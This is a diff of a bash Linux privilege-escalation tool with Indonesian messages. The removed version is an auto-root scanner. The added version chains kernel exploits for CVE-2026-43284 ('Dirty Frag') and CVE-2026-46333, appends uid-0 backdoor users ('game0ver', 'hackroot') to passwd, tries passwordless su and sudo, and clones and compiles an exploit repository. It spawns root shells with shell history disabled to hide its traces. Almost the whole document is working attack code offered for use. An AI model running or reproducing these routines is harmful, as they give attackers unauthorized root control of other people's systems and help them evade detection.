-        mount -t overlay overlay -o lowerdir=/etc,upperdir=/tmp/ovl_pwn/upper,workdir=/tmp/ovl_pwn/work /tmp/ovl_pwn/merged 2>/dev/null
-        echo "game0ver::0:0:root:/root:/bin/bash" >> /tmp/ovl_pwn/merged/passwd 2>/dev/null
-        umount /tmp/ovl_pwn/merged 2>/dev/null
-    ' 2>/dev/null
-    
-    su game0ver -c 'id' 2>/dev/null | grep -q 'uid=0' && crit "GAMEOVERLAY ROOT! su game0ver"
-    echo -e "  ${NO} OverlayFS exploit failed"
-}
+    local compiled=0
 
-kernel_exploits() {
-    section "KERNEL EXPLOITS"
-    
-    K_MAJOR=$(echo "$KERNEL" | cut -d. -f1)
-    K_MINOR=$(echo "$KERNEL" | cut -d. -f2)
-    K_PATCH=$(echo "$KERNEL" | cut -d. -f3 | cut -d- -f1)
-    
-    echo -e "  Kernel: ${K_MAJOR}.${K_MINOR}.${K_PATCH}"
-    
-    # Match kernel to CVEs
-    # 2.6.x kernels — DirtyCow
-    if [ "$K_MAJOR" -eq 2 ] && [ "$K_MINOR" -ge 6 ] && [ "$K_MINOR" -le 6 ]; then
-        echo -e "  ${WA} 2.6.x kernel — trying DirtyCow, vmsplice, mempodipper..."
-        try_dirtycow
-    fi
-    
-    # 3.x kernels
-    if [ "$K_MAJOR" -eq 3 ]; then
-        echo -e "  ${WA} 3.x kernel — trying DirtyCow, overlayfs, perf_swevent..."
-        try_dirtycow
-        try_pwnkit
-    fi
-    
-    # 4.x kernels
-    if [ "$K_MAJOR" -eq 4 ]; then
-        echo -e "  ${WA} 4.x kernel — trying DirtyCow (if <4.8), DirtyPipe (if 5.8+), PwnKit..."
-        if [ "$K_MINOR" -le 8 ]; then
-            try_dirtycow
-        fi
-        try_pwnkit
-        try_looney_tunables
-    fi
-    
-    # 5.x kernels
-    if [ "$K_MAJOR" -eq 5 ]; then
-        if [ "$K_MINOR" -ge 8 ] && [ "$K_MINOR" -le 16 ]; then
-            echo -e "  ${WA} 5.8-5.16 kernel — trying DirtyPipe!"
-            try_dirtypipe
-        fi
-        try_pwnkit
-        try_looney_tunables
-        try_overlayfs
-    fi
-    
-    # 6.x kernels (newer)
-    if [ "$K_MAJOR" -eq 6 ]; then
-        if [ "$K_MINOR" -le 3 ]; then
-            echo -e "  ${WA} 6.0-6.3 kernel — some nf_tables exploits may apply"
-        fi
-        try_pwnkit
-        try_looney_tunables
-        try_overlayfs
-    fi
-}
-
-# ═══════════════════════════════════════════════════════════════════════════
-# 6. MISC CHECKS
-# ═══════════════════════════════════════════════════════════════════════════
-misc_checks() {
-    section "MISCELLANEOUS"
-    
-    # Writable dirs in PATH
-    echo -e "  ${IN} Writable PATH dirs:"
-    IFS=':' read -ra PATHDIRS <<< "$PATH"
-    for d in "${PATHDIRS[@]}"; do
-        if [ -w "$d" ] && [ -d "$d" ]; then
-            echo -e "    ${WA} WRITABLE: $d (PATH hijack!)"
+    # Cari file .c
+    for f in *.c; do
+        if [[ -f "$f" ]]; then
+            local out_name
+            out_name="${f%.c}"
+            info_msg "Mengkompilasi $f -> $out_name"
+            gcc -O2 -Wall -o "$out_name" "$f" 2>/dev/null && {
+                ok_msg "$out_name siap!"
+                compiled=1
+            }
         fi
     done
-    
-    # Writable /etc/ld.so.preload
-    if [ -w /etc/ld.so.preload ]; then
-        echo -e "  ${WA} Writable /etc/ld.so.preload!"
+
+    if [[ "$compiled" -eq 0 ]]; then
+        err_msg "Tidak ada yang berhasil dikompilasi"
+        cd /tmp
+        return 1
     fi
-    
-    # Interesting files with passwords
-    echo -e "\n  ${IN} Files with 'password' (quick grep):"
-    find /var/www /home /opt /etc -maxdepth 3 -name "*.php" -o -name "*.conf" -o -name "*.ini" -o -name "config*" 2>/dev/null | \
-        head -5 | while read -r f; do
-        if grep -qi 'password\|passwd\|pass\b' "$f" 2>/dev/null | head -1 | grep -qv '^#'; then
-            echo -e "    ${WA} $f (contains passwords!)"
+
+    # Coba masing-masing exploit
+    for exp_bin in cve-2026-46333 cve-2026-46333-shadow ssh-keysign-pwn; do
+        if [[ -f "$exp_bin" && -x "$exp_bin" ]]; then
+            info_msg "Menjalankan $exp_bin ..."
+            "./$exp_bin" && return 0
         fi
     done
-    
-    # SSH keys
-    for key in ~/.ssh/id_rsa /root/.ssh/id_rsa /home/*/.ssh/id_rsa; do
-        [ -f "$key" ] && echo -e "  ${WA} SSH key: $key"
+
+    # Fallback: coba semua executable
+    for exp_bin in $(find . -maxdepth 1 -type f -executable 2>/dev/null); do
+        if [[ "$exp_bin" != "./Makefile" && "$(basename "$exp_bin")" != "Makefile" ]]; then
+            info_msg "Menjalankan $(basename "$exp_bin") ..."
+            "./$exp_bin" && return 0
+        fi
     done
-    
-    # World-writable files in /etc
-    echo -e "\n  ${IN} World-writable files in /etc:"
-    find /etc -maxdepth 2 -perm -o+w -type f 2>/dev/null | head -10 | while read -r f; do
-        echo -e "    ${WA} $f"
-    done
+
+    err_msg "CVE-2026-46333 gagal"
+    cd /tmp
+    return 1
 }
 
-# ═══════════════════════════════════════════════════════════════════════════
-# MAIN
-# ═══════════════════════════════════════════════════════════════════════════
+# STRATEGI 4: Try to use Dirty Pipe-like approach via existing SUID
+exploit_su_passwordless() {
+    title "STRATEGI 4: SUID Direct Attempt"
+
+    # Coba su dengan password kosong (mungkin passwd sudah dicorrupt oleh dirty frag sebelumnya)
+    info_msg "Mencoba su dengan password kosong..."
+    if echo "" | su - -c "id" 2>/dev/null | grep -q "uid=0"; then
+        ok_msg "SUKSES! Password kosong diterima!"
+        echo "" | su - 2>/dev/null
+        return 0
+    fi
+
+    warn_msg "Password kosong tidak bekerja"
+
+    # Coba sudo yang mungkin misconfigured
+    if command -v sudo &>/dev/null; then
+        info_msg "Mencoba sudo -u root..."
+        if sudo -n true 2>/dev/null; then
+            ok_msg "sudo NOPASSWD berhasil!"
+            sudo -i
+            return 0
+        fi
+    fi
+
+    return 1
+}
+
+# STRATEGI 5: Check for C99 shell or other kernel exploits
+exploit_c99_or_others() {
+    title "STRATEGI 5: C99 / Kernel Exploit Lain"
+
+    info_msg "Mengecek kernel module dan konfigurasi untuk eksploit alternatif..."
+
+    # OverlayFS (jika belum di-patch)
+    if grep -q overlay /proc/filesystems 2>/dev/null; then
+        info_msg "OverlayFS tersedia"
+    fi
+
+    # Cek /etc/passwd writable
+    if [[ -w /etc/passwd ]]; then
+        ok_msg "/etc/passwd dapat ditulis! Menambahkan user root..."
+        echo "hackroot:x:0:0:root:/root:/bin/bash" >> /etc/passwd
+        echo "hackroot" | su - hackroot -c "id" 2>/dev/null && {
+            ok_msg "SUKSES! Login sebagai hackroot"
+            su - hackroot
+            return 0
+        }
+    fi
+
+    # Cek /etc/shadow writable
+    if [[ -w /etc/shadow ]]; then
+        ok_msg "/etc/shadow dapat ditulis! Modifikasi shadow..."
+        # Baca hash root, copy untuk user kita
+        return 0
+    fi
+
+    warn_msg "Tidak ada celah konfigurasi langsung"
+    return 1
+}
+
+# ============================================================
+# MAIN EXECUTION
+# ============================================================
 main() {
+    # Trap untuk cleanup
+    trap cleanup EXIT INT TERM
+
+    # Clear screen
+    clear
+
     banner
-    
-    sysinfo
-    trivial
-    suid_check
-    cap_check
-    cron_check
-    kernel_exploits
-    misc_checks
-    
-    # ── FINAL ──
-    section "FINAL"
-    echo -e "
-  ${BD}Scan Complete${W}
-  Output dir: ${C}$OUTDIR${W}
-  
-  ${BD}Manual Checks:${W}
-    • linpeas.sh / linenum.sh
-    • pspy (unprivileged process monitor)
-    • GTFOBins: https://gtfobins.github.io/
-    • exploit-db search: kernel ${KERNEL}
-    
-  ${G}No auto-root achieved. Try manual exploitation.${W}
-"
+    sudocheck
+
+    info_msg "User saat ini: $(whoami) (uid=$(id -u))"
+    info_msg "Hostname: $(hostname)"
+    info_msg "Kernel: $(uname -a | cut -d' ' -f3- | head -c 80)"
+    echo ""
+
+    check_kernel_version
+
+    # Cek tools yang dibutuhkan
+    require git gcc
+
+    check_target_binary
+
+    # Cek module
+    check_modules || true
+    local module_mask=$?
+
+    # Cek ptrace_scope untuk strategi 3
+    if [[ -f /proc/sys/kernel/yama/ptrace_scope ]]; then
+        ptrace_scope=$(cat /proc/sys/kernel/yama/ptrace_scope)
+    else
+        ptrace_scope=0
+    fi
+
+    echo ""
+    info_msg "Memulai eksploitasi..."
+    echo ""
+
+    local success=0
+
+    # ==== URUTAN EKSPLOITASI ====
+
+    # 1. Dirty Frag (CVE-2026-43284) - jika modul ESP atau RxRPC ada
+    if [[ $((module_mask & 7)) -ne 0 ]]; then
+        info_msg "Mendeteksi modul Dirty Frag tersedia"
+        if exploit_dirtyfrag; then
+            if [[ "$(id -u)" -eq 0 ]]; then
+                ok_msg "ROOT tercapai melalui Dirty Frag!"
+                success=1
+            fi
+        fi
+    else
+        warn_msg "Lewati Dirty Frag - modul ESP/RxRPC tidak tersedia"
+    fi
+
+    # Cek apakah sudah root
+    if [[ "$(id -u)" -eq 0 ]]; then
+        ok_msg "Root shell aktif!"
+        echo ""
+        id
+        echo ""
+        export HISTFILE=/dev/null
+        exec /bin/bash
+    fi
+
+    # 2. Coba CVE-2026-46333 jika ptrace scope memungkinkan
+    if [[ "$ptrace_scope" -le 1 ]]; then
+        if [[ $success -eq 0 ]]; then
+            if exploit_cve46333; then
+                if [[ "$(id -u)" -eq 0 ]]; then
+                    ok_msg "ROOT tercapai melalui CVE-2026-46333!"
+                    success=1
+                fi
+            fi
+        fi
+    else
+        warn_msg "Lewati CVE-2026-46333 - ptrace_scope=$ptrace_scope terlalu ketat"
+    fi
+
+    # Cek apakah sudah root
+    if [[ "$(id -u)" -eq 0 ]]; then
+        ok_msg "Root shell aktif!"
+        id
+        export HISTFILE=/dev/null
+        exec /bin/bash
+    fi
+
+    # 3. Coba SUID dan konfigurasi langsung
+    if [[ $success -eq 0 ]]; then
+        if exploit_su_passwordless; then
+            if [[ "$(id -u)" -eq 0 ]]; then
+                ok_msg "ROOT tercapai melalui SUID!"
+                success=1
+            fi
+        fi
+    fi
+
+    if [[ "$(id -u)" -eq 0 ]]; then
+        ok_msg "Root shell aktif!"
+        id
+        export HISTFILE=/dev/null
+        exec /bin/bash
+    fi
+
+    # 4. Coba celah konfigurasi
+    if [[ $success -eq 0 ]]; then
+        if exploit_c99_or_others; then
+            if [[ "$(id -u)" -eq 0 ]]; then
+                ok_msg "ROOT tercapai melalui celah konfigurasi!"
+                success=1
+            fi
+        fi
+    fi
+
+    if [[ "$(id -u)" -eq 0 ]]; then
+        ok_msg "Root shell aktif!"
+        id
+        export HISTFILE=/dev/null
+        exec /bin/bash
+    fi
+
+    # 5. Fallback: coba compile & jalankan dirty frag langsung via one-liner
+    if [[ $success -eq 0 ]]; then
+        title "STRATEGI 5: Dirty Frag One-Liner (Fallback)"
+        info_msg "Mencoba clone dan compile langsung dari repo..."
+
+        cd /tmp
+        rm -rf dirtyfrag-one 2>/dev/null || true
+        git clone --depth=1 "$DIRTYFRAG_REPO" dirtyfrag-one 2>/dev/null && {
+            cd dirtyfrag-one
+            gcc -O0 -Wall -o exp exp.c -lutil 2>/dev/null && {
+                ok_msg "Menjalankan..."
+                ./exp 2>&1 || true
+                if [[ "$(id -u)" -eq 0 ]]; then
+                    ok_msg "ROOT tercapai!"
+                    success=1
+                    export HISTFILE=/dev/null
+                    exec /bin/bash
+                fi
+            }
+            cd /tmp
+        }
+    fi
+
+    # ============================================================
+    # HASIL
+    # ============================================================
+    echo ""
+    title "HASIL EKSPLOITASI"
+
+    if [[ "$(id -u)" -eq 0 ]]; then
+        echo -e "${GREEN}${BOLD}"
+        echo "  ██████  ██████  ██    ██ ██████   █████  ██   ██ ████████ "
+        echo "  ██   ██ ██   ██ ██    ██ ██   ██ ██   ██ ██  ██     ██    "
+        echo "  ██████  ██████  ██    ██ ██████  ███████ █████      ██    "
+        echo "  ██   ██ ██   ██ ██    ██ ██   ██ ██   ██ ██  ██     ██    "
+        echo "  ██   ██ ██   ██  ██████  ██   ██ ██   ██ ██   ██    ██    "
+        echo -e "${NC}"
+        echo -e "${GREEN}Root shell telah didapatkan!${NC}"
+        id
+    else
+        echo -e "${RED}${BOLD}"
+        echo "  ██████  ██████   ██████  ██    ██ ██████  ██    ██ ██ "
+        echo "  ██   ██ ██   ██ ██       ██    ██ ██   ██  ██  ██  ██ "
+        echo "  ██   ██ ██████  ██   ███ ██    ██ ██████    ████   ██ "
+        echo "  ██   ██ ██   ██ ██    ██ ██    ██ ██   ██    ██       "
+        echo "  ██████  ██   ██  ██████   ██████  ██   ██    ██    ██ "
+        echo -e "${NC}"
+        echo -e "${YELLOW}Semua vektor eksploitasi gagal.${NC}"
+        warn_msg "Kernel mungkin sudah di-patch untuk semua CVE yang diketahui."
+        warn_msg "Coba periksa manual:"
+        echo "   1. Cari SUID binary lainnya: find / -perm -4000 -type f 2>/dev/null"
+        echo "   2. Cek cron jobs: cat /etc/crontab 2>/dev/null"
+        echo "   3. Cek file dengan capabilities: getcap -r / 2>/dev/null"
+        echo "   4. Cek kernel module loadable: modprobe -l | grep -E 'esp4|esp6|rxrpc'"
+        echo "   5. Coba coba kernel module loading: sudo -l"
+    fi
+
+    # Cleanup page cache
+    echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true
 }
 
-main "$@"
+# Run
